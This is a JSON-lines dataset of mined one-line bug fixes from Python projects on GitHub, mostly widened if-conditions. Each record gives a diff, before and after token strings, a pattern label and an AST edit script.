{"project": "gramps", "commit_sha": "7f3d94ae4462d37d48a54085b4833cc300a03dae", "parent_sha": "152a452b2ee2ffef6d0682a8f3d9a112f58d0cf1", "file_path": "src/ReportBase/_GraphvizReportDialog.py", "project_url": "https://github.com/jelmer/gramps", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -154,7 +154,7 @@ class GVDocBase(BaseDoc.BaseDoc,BaseDoc.GVDoc):\n #-------------------------------------------------------------------------------\n class GVDotDoc(GVDocBase):\n     def close(self):\n-        GVDoc.close(self)\n+        GVDocBase.close(self)\n         \n         # Make sure the extension is correct\n         if self.filename[-4:] != \".dot\":\n", "before": "GVDoc . close ( self )", "after": "GVDocBase . close ( self )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:GVDoc\", 3, 9, 3, 14], \"GVDocBase\"]]"}
{"project": "boto", "commit_sha": "059f525b8731556f4878cc46a7712f7c92f91940", "parent_sha": "8a025df86554a555cb4b58357803f4df044e2c6f", "file_path": "boto/dynamodb/types.py", "project_url": "https://github.com/tinyclues/boto", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -333,7 +333,7 @@ class Dynamizer(object):\n-        if len(attr) > 1 or not attr:\n+        if len(attr) > 1 or not attr or isinstance(attr, basestring):\n             return attr\n         dynamodb_type = list(attr.keys())[0]\n         if dynamodb_type.lower() == dynamodb_type:\n", "before": "if len ( attr ) > 1 or not attr : return attr", "after": "if len ( attr ) > 1 or not attr or isinstance ( attr , basestring ) : return attr", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 0, 29, 0, 37], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:attr\", 0, 33, 0, 37], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:isinstance\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"identifier:attr\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:basestring\", \"T\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4]]"}
{"project": "openobject-server", "commit_sha": "04f22ef2c33129c0e7f1ef5a6690ec36f2e6deb0", "parent_sha": "d19c08f57ad10bd73d9b431ae3aa61dc4c324543", "file_path": "openerp/addons/base/ir/ir_translation.py", "project_url": "https://github.com/gisce/openobject-server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -307,7 +307,7 @@ class ir_translation(osv.osv):\n             context = {}\n         if isinstance(ids, (int, long)):\n             ids = [ids]\n-        if vals.get('src'):\n+        if vals.get('src') or ('value' in vals and not(vals.get('value'))):\n             result = vals.update({'state':'to_translate'})\n         if vals.get('value'):\n             result = vals.update({'state':'translated'})\n", "before": "if vals . get ( 'src' ) : result = vals . update ( { 'state' : 'to_translate' } )", "after": "if vals . get ( 'src' ) or ( 'value' in vals and not ( vals . get ( 'value' ) ) ) : result = vals . update ( { 'state' : 'to_translate' } )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 59], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 27], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"parenthesized_expression\", \"N1\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"boolean_operator\", \"N2\"], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2], [\"Insert\", \"N2\", [\"comparison_operator\", \"N3\"], 0], [\"Insert\", \"N2\", [\"and:and\", \"T\"], 1], [\"Insert\", \"N2\", [\"not_operator\", \"N4\"], 2], [\"Insert\", \"N3\", [\"string:'value'\", \"T\"], 0], [\"Insert\", \"N3\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:vals\", \"T\"], 2], [\"Insert\", \"N4\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N4\", [\"parenthesized_expression\", \"N5\"], 1], [\"Insert\", \"N5\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N5\", [\"call\", \"N6\"], 1], [\"Insert\", \"N5\", [\"):)\", \"T\"], 2], [\"Insert\", \"N6\", [\"attribute\", \"N7\"], 0], [\"Insert\", \"N6\", [\"argument_list\", \"N8\"], 1], [\"Insert\", \"N7\", [\"identifier:vals\", \"T\"], 0], [\"Insert\", \"N7\", [\".:.\", \"T\"], 1], [\"Insert\", \"N7\", [\"identifier:get\", \"T\"], 2], [\"Insert\", \"N8\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N8\", [\"string:'value'\", \"T\"], 1], [\"Insert\", \"N8\", [\"):)\", \"T\"], 2]]"}
{"project": "openshift-ansible", "commit_sha": "8a1775c1b72d30452c910837b704f2d51f0aa559", "parent_sha": "7900f45d2d8ef566cf3f330a33364dd217a93c1d", "file_path": "roles/openshift_facts/library/openshift_facts.py", "project_url": "https://github.com/mjudeikis/openshift-ansible", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -490,7 +490,7 @@ def set_selectors(facts):\n         facts['hosted']['metrics'] = {}\n     if 'selector' not in facts['hosted']['metrics'] or facts['hosted']['metrics']['selector'] in [None, 'None']:\n         facts['hosted']['metrics']['selector'] = None\n-    if 'logging' not in facts:\n+    if 'logging' not in facts or not isinstance(facts['logging'], dict):\n         facts['logging'] = {}\n     if 'selector' not in facts['logging'] or facts['logging']['selector'] in [None, 'None']:\n         facts['logging']['selector'] = None\n", "before": "if 'logging' not in facts : facts [ 'logging' ] = { }", "after": "if 'logging' not in facts or not isinstance ( facts [ 'logging' ] , dict ) : facts [ 'logging' ] = { }", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 5, 4, 30], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 8, 3, 30], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"not_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N1\", [\"call\", \"N2\"], 1], [\"Insert\", \"N2\", [\"identifier:isinstance\", \"T\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"subscript\", \"N4\"], 1], [\"Insert\", \"N3\", [\",:,\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:dict\", \"T\"], 3], [\"Insert\", \"N3\", [\"):)\", \"T\"], 4], [\"Insert\", \"N4\", [\"identifier:facts\", \"T\"], 0], [\"Insert\", \"N4\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N4\", [\"string:'logging'\", \"T\"], 2], [\"Insert\", \"N4\", [\"]:]\", \"T\"], 3]]"}
{"project": "ADLxMLDS2017", "commit_sha": "70b30d761a41f9def19b1c2d6ee7f98de6e184c8", "parent_sha": "f10edd877ea900ec561fa5214d380c63a1c2ad18", "file_path": "hw3/agent_dir/agent_dqn.py", "project_url": "https://github.com/liuyenting/ADLxMLDS2017", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -89,7 +89,7 @@ class Agent_DQN(Agent):\n \n         self.sess.run(tf.global_variables_initializer())\n \n-        if args.test_dqn:\n+        if args.test_dqn or LOAD_NETWORK:\n             self.load_network()\n \n         # Initialize target network\n", "before": "if args . test_dqn : self . load_network ( )", "after": "if args . test_dqn or LOAD_NETWORK : self . load_network ( )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 32], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 12, 3, 25], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:LOAD_NETWORK\", \"T\"], 2]]"}
{"project": "osf.io", "commit_sha": "03ee406800fb59ff3e7565397107fa9aad0d54d0", "parent_sha": "c64c3a741c271b4a12e2dddebf05d2f8292211d7", "file_path": "website/notifications/listeners.py", "project_url": "https://github.com/Vhoakab84/osf.io", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -8,7 +8,7 @@ logger = logging.getLogger(__name__)\n \n @project_created.connect\n def subscribe_creator(node):\n-    if node.is_collection or node.is_deleted:\n+    if node.institution_id or node.is_collection or node.is_deleted:\n         return None\n     try:\n         subscribe_user_to_notifications(node, node.creator)\n", "before": "if node . is_collection or node . is_deleted : return None", "after": "if node . institution_id or node . is_collection or node . is_deleted : return None", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 8, 3, 45], [\"boolean_operator\", \"N0\"], 0], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 8, 3, 26], 2], [\"Insert\", \"N1\", [\"identifier:node\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:institution_id\", \"T\"], 2]]"}
{"project": "python-prompt-toolkit", "commit_sha": "6f0336078f0a8410b33fbb89cbfb6908572f170a", "parent_sha": "144f9c28cf54eaee437197c5dde5b2c6dc7ae385", "file_path": "prompt_toolkit/key_binding/bindings/vi.py", "project_url": "https://github.com/melund/python-prompt-toolkit", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1609,7 +1609,8 @@ def load_vi_bindings(registry, enable_visual_key=Always(),\n \n         for p2 in buff.multiple_cursor_positions:\n             text.append(original_text[p:p2])\n-            if original_text[p2] == '\\n':  # Don't delete across lines.\n+            if p2 >= len(original_text) or original_text[p2] == '\\n':\n+                # Don't delete across lines.\n                 p = p2\n             else:\n                 p = p2 + 1\n", "before": "if original_text [ p2 ] == '\\n' : p = p2 else : p = p2 + 1", "after": "if p2 >= len ( original_text ) or original_text [ p2 ] == '\\n' : p = p2 else : p = p2 + 1", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 6, 27], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 41], 2], [\"Insert\", \"N1\", [\"identifier:p2\", \"T\"], 0], [\"Insert\", \"N1\", [\">=:>=\", \"T\"], 1], [\"Insert\", \"N1\", [\"call\", \"N2\"], 2], [\"Insert\", \"N2\", [\"identifier:len\", \"T\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"identifier:original_text\", \"T\"], 1], [\"Insert\", \"N3\", [\"):)\", \"T\"], 2]]"}
{"project": "gratipay.com", "commit_sha": "3c79b344bc33acc5c757ced3b331bd01d4cb0084", "parent_sha": "e8b60b6af856f227a2167548b36cbacfcc84aa2c", "file_path": "gratipay/billing/payday.py", "project_url": "https://github.com/haonature/gratipay.com", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -390,7 +390,7 @@ class Payday(object):\n         holds = {}\n         for hold in CardHold.query.filter(CardHold.f.meta.state == 'new'):\n             state = 'new'\n-            if hold.failure_reason:\n+            if hold.status == 'failed' or hold.failure_reason:\n                 state = 'failed'\n             elif hold.voided_at:\n                 state = 'cancelled'\n", "before": "if hold . failure_reason : state = 'failed' elif hold . voided_at : state = 'cancelled'", "after": "if hold . status == 'failed' or hold . failure_reason : state = 'failed' elif hold . voided_at : state = 'cancelled'", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 6, 36], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 16, 3, 35], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'failed'\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:hold\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:status\", \"T\"], 2]]"}
{"project": "gratipay.com", "commit_sha": "b2049f85e63212063daff47c4ed4542abad5eedf", "parent_sha": "6e20fa46ddf1beb86057805ef41e035b2a0717e1", "file_path": "gittip/models/community.py", "project_url": "https://github.com/vemmaverve/gratipay.com", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -35,7 +35,7 @@ def get_list_for(user):\n-    if user.ANON:\n+    if user is None or user.ANON:\n         member_test = \"false\"\n         sort_order = 'DESC'\n         params = ()\n", "before": "if user . ANON : member_test = \"false\" sort_order = 'DESC' params = ( )", "after": "if user is None or user . ANON : member_test = \"false\" sort_order = 'DESC' params = ( )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 0, 5, 3, 20], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"attribute\", 0, 8, 0, 17], 2], [\"Insert\", \"N1\", [\"identifier:user\", \"T\"], 0], [\"Insert\", \"N1\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N1\", [\"none:None\", \"T\"], 2]]"}
{"project": "erpnext", "commit_sha": "fc51f995c82df41ca792482979a9b49d83be11c3", "parent_sha": "7ff69e10bfac9e034f14d80247a5b0c9dcb92b40", "file_path": "erpnext/stock/doctype/bin/bin.py", "project_url": "https://github.com/indautgrp/erpnext", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -325,7 +325,7 @@ class DocType:\n \t\t\n \t\t# update the bin\n-\t\tif sll:\n+\t\tif sll or not prev_sle:\n \t\t\tsql(\"update `tabBin` set valuation_rate=%s, actual_qty=%s, stock_value = %s where name=%s\", \\\n \t\t\t\t(flt(val_rate), cqty, flt(stock_val), self.doc.name))\n \n", "before": "if sll : sql ( \"update `tabBin` set valuation_rate=%s, actual_qty=%s, stock_value = %s where name=%s\" , ( flt ( val_rate ) , cqty , flt ( stock_val ) , self . doc . name ) )", "after": "if sll or not prev_sle : sql ( \"update `tabBin` set valuation_rate=%s, actual_qty=%s, stock_value = %s where name=%s\" , ( flt ( val_rate ) , cqty , flt ( stock_val ) , self . doc . name ) )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 2, 3, 4, 58], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:sll\", 2, 6, 2, 9], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"not_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N1\", [\"identifier:prev_sle\", \"T\"], 1]]"}
{"project": "OpenBazaar", "commit_sha": "42e696a6a8cbd5b68d4de5c9dfc41e0ee4ebc835", "parent_sha": "bcb8f60fdb8cbce353aa2c4a765ec3e3814513f6", "file_path": "node/market.py", "project_url": "https://github.com/roguesupport/OpenBazaar", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -266,7 +266,7 @@ class Market(object):\n         notaries = self.settings.get('notaries')\n \n         self.log.debug(\"notaries: %s\", notaries)\n-        if notaries == \"\" or notaries == []:\n+        if notaries == \"\" or notaries == [] or not notaries:\n             notaries = []\n         else:\n             notaries = json.loads(notaries)\n", "before": "if notaries == \"\" or notaries == [ ] : notaries = [ ] else : notaries = json . loads ( notaries )", "after": "if notaries == \"\" or notaries == [ ] or not notaries : notaries = [ ] else : notaries = json . loads ( notaries )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 12, 3, 44], [\"boolean_operator\", 3, 12, 3, 44], 0], [\"Insert\", [\"boolean_operator\", 3, 12, 3, 44], [\"or:or\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 12, 3, 44], [\"not_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N0\", [\"identifier:notaries\", \"T\"], 1]]"}
{"project": "gui2py", "commit_sha": "ce69833aac7a7f365631f10533e2c605577996d1", "parent_sha": "36db00d410f0762a5aa667fb339daad6324a7d77", "file_path": "gui/controls/listview.py", "project_url": "https://github.com/theonlynexus/gui2py", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -337,7 +337,7 @@ class ListModel(dict):\n             if not isinstance(text, basestring):\r\n                 text = col.represent(text)\r\n             if col.index == 0:\r\n-                if wx.VERSION < (2, 9, 5):\r\n+                if wx.VERSION < (2, 9, 5) or wx.VERSION >= (3, 0, 0):\r\n                     self._list_view.wx_obj.InsertStringItem(index, text)\r\n                 else:\r\n                     self._list_view.wx_obj.InsertItem(index, text)\r\n", "before": "if wx . VERSION < ( 2 , 9 , 5 ) : self . _list_view . wx_obj . InsertStringItem ( index , text ) else : self . _list_view . wx_obj . InsertItem ( index , text )", "after": "if wx . VERSION < ( 2 , 9 , 5 ) or wx . VERSION >= ( 3 , 0 , 0 ) : self . _list_view . wx_obj . InsertStringItem ( index , text ) else : self . _list_view . wx_obj . InsertItem ( index , text )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 6, 67], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 20, 3, 42], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\">=:>=\", \"T\"], 1], [\"Insert\", \"N1\", [\"tuple\", \"N3\"], 2], [\"Insert\", \"N2\", [\"identifier:wx\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:VERSION\", \"T\"], 2], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"integer:3\", \"T\"], 1], [\"Insert\", \"N3\", [\",:,\", \"T\"], 2], [\"Insert\", \"N3\", [\"integer:0\", \"T\"], 3], [\"Insert\", \"N3\", [\",:,\", \"T\"], 4], [\"Insert\", \"N3\", [\"integer:0\", \"T\"], 5], [\"Insert\", \"N3\", [\"):)\", \"T\"], 6]]"}
{"project": "TTRanger", "commit_sha": "4507c7f48c479afb9ccb654346156b8ae652f969", "parent_sha": "3ecfef2dd18d2bd82aa2068d4ce72402f0525554", "file_path": "toontown/catalog/CatalogPetTrickItem.py", "project_url": "https://github.com/colenoreika/TTRanger", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -17,7 +17,7 @@ class CatalogPetTrickItem(CatalogItem.CatalogItem):\n         return 1\n \n     def reachedPurchaseLimit(self, avatar):\n-        if self in avatar.onOrder or self in avatar.mailboxContents or self in avatar.onGiftOrder or self in avatar.awardMailboxContents or self in avatar.onAwardOrder:\n+        if self in avatar.onOrder or self in avatar.mailboxContents or self in avatar.onGiftOrder or self in avatar.awardMailboxContents or self in avatar.onAwardOrder or not hasattr(avatar, 'petTrickPhrases'):\n             return 1\n         return self.trickId in avatar.petTrickPhrases\n \n", "before": "if self in avatar . onOrder or self in avatar . mailboxContents or self in avatar . onGiftOrder or self in avatar . awardMailboxContents or self in avatar . onAwardOrder : return 1", "after": "if self in avatar . onOrder or self in avatar . mailboxContents or self in avatar . onGiftOrder or self in avatar . awardMailboxContents or self in avatar . onAwardOrder or not hasattr ( avatar , 'petTrickPhrases' ) : return 1", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 12, 3, 168], [\"boolean_operator\", 3, 12, 3, 168], 0], [\"Insert\", [\"boolean_operator\", 3, 12, 3, 168], [\"or:or\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 12, 3, 168], [\"not_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N0\", [\"call\", \"N1\"], 1], [\"Insert\", \"N1\", [\"identifier:hasattr\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"identifier:avatar\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"string:'petTrickPhrases'\", \"T\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4]]"}
{"project": "preservationist", "commit_sha": "2ade78acfec3298c1f888e9df5e149dcd9940330", "parent_sha": "b5f657dcd835c25bb2f4057b7dfa8b0f952cdf03", "file_path": "preservationist.py", "project_url": "https://github.com/gcross/preservationist", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -203,7 +203,7 @@ dry_run,\n     # Updating the latest link\n     if hasattr(os,'symlink'):\n         latest_path = os.path.join(snapshot_directory,'latest')\n-        if os.path.exists(latest_path):\n+        if os.path.exists(latest_path) or os.path.islink(latest_path):\n             log('Removing old latest link...')\n             if not dry_run:\n                 os.remove(latest_path)\n", "before": "if os . path . exists ( latest_path ) : log ( 'Removing old latest link...' ) if not dry_run : os . remove ( latest_path )", "after": "if os . path . exists ( latest_path ) or os . path . islink ( latest_path ) : log ( 'Removing old latest link...' ) if not dry_run : os . remove ( latest_path )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 39], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 39], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N2\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:islink\", \"T\"], 2], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"identifier:latest_path\", \"T\"], 1], [\"Insert\", \"N3\", [\"):)\", \"T\"], 2], [\"Insert\", \"N4\", [\"identifier:os\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:path\", \"T\"], 2]]"}
{"project": "pyfolio", "commit_sha": "0bb7f2ca15a89e0bfa9bfd78bfcc185257444e44", "parent_sha": "2e5b9fd9aac31b7cfcb079d28a7e901c1896d280", "file_path": "pyfolio/timeseries.py", "project_url": "https://github.com/jaCod3r/pyfolio", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -763,7 +763,7 @@ def get_top_drawdowns(returns, top=10):\n             underwater = underwater.loc[:peak]\n \n         drawdowns.append((peak, valley, recovery))\n-        if len(returns) == 0:\n+        if (len(returns) == 0) or (len(underwater) == 0):\n             break\n \n     return drawdowns\n", "before": "if len ( returns ) == 0 : break", "after": "if ( len ( returns ) == 0 ) or ( len ( underwater ) == 0 ) : break", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 18], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"parenthesized_expression\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"parenthesized_expression\", \"N2\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"comparison_operator\", 3, 12, 3, 29], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"comparison_operator\", \"N3\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2], [\"Insert\", \"N3\", [\"call\", \"N4\"], 0], [\"Insert\", \"N3\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N3\", [\"integer:0\", \"T\"], 2], [\"Insert\", \"N4\", [\"identifier:len\", \"T\"], 0], [\"Insert\", \"N4\", [\"argument_list\", \"N5\"], 1], [\"Insert\", \"N5\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N5\", [\"identifier:underwater\", \"T\"], 1], [\"Insert\", \"N5\", [\"):)\", \"T\"], 2]]"}
{"project": "picard", "commit_sha": "f3ae42a981bf992f83e1012f467fc490aaf9368e", "parent_sha": "59fceb3c20df458d711ced465103839e40e6caa0", "file_path": "picard/musicdns/__init__.py", "project_url": "https://github.com/phw/picard", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -90,7 +90,7 @@ class OFA(QtCore.QObject):\n             # The file has been removed. do nothing\n             return\n         \n-        if result is None or error is not None:\n+        if result is None or result[0] is None or error is not None:\n             next(file, result=None)\n             return\n         fingerprint, length = result\n", "before": "if result is None or error is not None : next ( file , result = None ) return", "after": "if result is None or result [ 0 ] is None or error is not None : next ( file , result = None ) return", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 12, 3, 47], [\"boolean_operator\", \"N0\"], 0], [\"Insert\", [\"boolean_operator\", 3, 12, 3, 47], [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 26], 0], [\"Move\", \"N0\", [\"or:or\", 3, 27, 3, 29], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"subscript\", \"N2\"], 0], [\"Insert\", \"N1\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N1\", [\"none:None\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:result\", \"T\"], 0], [\"Insert\", \"N2\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N2\", [\"integer:0\", \"T\"], 2], [\"Insert\", \"N2\", [\"]:]\", \"T\"], 3]]"}
{"project": "picard", "commit_sha": "60bbe12a5eaa076795723a77a7ab9758a486f38a", "parent_sha": "02fc7a30a8843777948a89799508186327be23fe", "file_path": "picard/album.py", "project_url": "https://github.com/phw/picard", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -195,7 +195,7 @@ class Album(DataObject, Item):\n                     self.log.error(traceback.format_exc())\n         finally:\n             self._requests -= 1\n-            if parsed:\n+            if parsed or error:\n                 self._finalize_loading(error)\n \n     def _release_group_request_finished(self, document, http, error):\n", "before": "if parsed : self . _finalize_loading ( error )", "after": "if parsed or error : self . _finalize_loading ( error )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 4, 46], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:parsed\", 3, 16, 3, 22], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:error\", \"T\"], 2]]"}
{"project": "upcnet.cas", "commit_sha": "b3cd936e136332b55471d60a6b99dff8c6151bd3", "parent_sha": "f2c2e4d0a4acae3287a6bc6d10504aa59c3e230a", "file_path": "upcnet/cas/util.py", "project_url": "https://github.com/UPCnet/upcnet.cas", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -31,7 +31,7 @@ def login_URL(context, request):\n \n         current_url = getMultiAdapter((context, request), name=u'plone_context_state').current_page_url()\n \n-        if current_url[-6:] == '/login' or current_url[-11:] == '/login_form':\n+        if current_url[-6:] == '/login' or current_url[-11:] == '/login_form' or 'require_login' in current_url:\n             url = loginForm_URL(context, request)\n         else:\n             url = '%s?idApp=%s&service=%s' % (plugin.getLoginURL(), cas_settings.cas_app_name, secureURL(unquote(plugin.getService())))\n", "before": "if current_url [ - 6 : ] == '/login' or current_url [ - 11 : ] == '/login_form' : url = loginForm_URL ( context , request ) else : url = '%s?idApp=%s&service=%s' % ( plugin . getLoginURL ( ) , cas_settings . cas_app_name , secureURL ( unquote ( plugin . getService ( ) ) ) )", "after": "if current_url [ - 6 : ] == '/login' or current_url [ - 11 : ] == '/login_form' or 'require_login' in current_url : url = loginForm_URL ( context , request ) else : url = '%s?idApp=%s&service=%s' % ( plugin . getLoginURL ( ) , cas_settings . cas_app_name , secureURL ( unquote ( plugin . getService ( ) ) ) )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 12, 3, 78], [\"boolean_operator\", 3, 12, 3, 78], 0], [\"Insert\", [\"boolean_operator\", 3, 12, 3, 78], [\"or:or\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 12, 3, 78], [\"comparison_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"string:'require_login'\", \"T\"], 0], [\"Insert\", \"N0\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:current_url\", \"T\"], 2]]"}
